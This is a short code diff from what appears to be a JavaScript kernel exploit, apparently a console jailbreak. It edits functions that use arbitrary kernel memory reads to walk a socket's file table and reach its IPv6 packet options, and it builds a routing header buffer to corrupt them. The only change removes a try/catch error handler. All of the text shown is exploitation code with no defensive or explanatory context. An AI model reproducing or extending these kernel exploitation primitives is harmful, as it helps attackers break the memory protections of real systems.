@@ -1193,8 +1193,8 @@ var  SIZEOF_OFILES = 0x8;
 var  INPCB_PKTOPTS = 0x118;
  
     
-
- try{
+ 
+ 
 function get_fd_data_addr(fd) {
   const filep = kmem.read64(ofiles.add(fd * SIZEOF_OFILES));
   return kmem.read64(filep.add(0));  
@@ -1205,10 +1205,8 @@ function get_sock_pktopts(fd) {
   const pcb = kmem.read64(so.add(SO_PCB));
   return kmem.read64(pcb.add(INPCB_PKTOPTS));
 }
- }
-    catch(e){
-           alert(e.message);
-    }
+ 
+ 
 
     const pktopts = new Buffer(0x100);
     const rsize = build_rthdr(pktopts, pktopts.size);
